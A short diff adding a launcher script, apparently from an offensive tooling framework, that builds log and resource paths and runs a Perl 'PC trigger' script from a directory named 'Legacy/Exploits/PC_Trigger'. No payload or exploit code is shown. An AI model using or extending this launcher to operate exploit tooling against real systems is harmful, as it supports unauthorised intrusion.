@@ -1,0 +1,30 @@
+
+@include "_LpHelperFunctions.dsi";
+@include "_Paths.dsi";
+@include "_VersionChecks.dsi";
+@echo off;
+
+string $logDir;
+_GetLpLogsDirectory($logDir);
+StrCat($logDir, "/LegacyPc/");
+_NormalizePath($logDir, _IsWindowsLocal());
+FileMkdir($logDir);
+
+string $rootDir;
+_GetLpResourcesDirectory($rootDir);
+StrCat($rootDir, "..");
+_NormalizePath($rootDir, _IsWindowsLocal());
+string $pcDir = "%_sgEnv{'script_path'}/../Legacy/Exploits/PC_Trigger";
+_NormalizePath($pcDir, _IsWindowsLocal());
+	
+string $cmdLine = 'perl $pcDir\\run_pctrigger.pl -d \\"$logDir\\" -e \\"$pcDir\\"';
+
+@echo on;
+if (!`local run -command "$cmdLine" -redirect`)
+{
+	echo("* Failed to run legacy PC trigger script", ERROR);
+	pause;
+	return false;
+}
+
+return true;
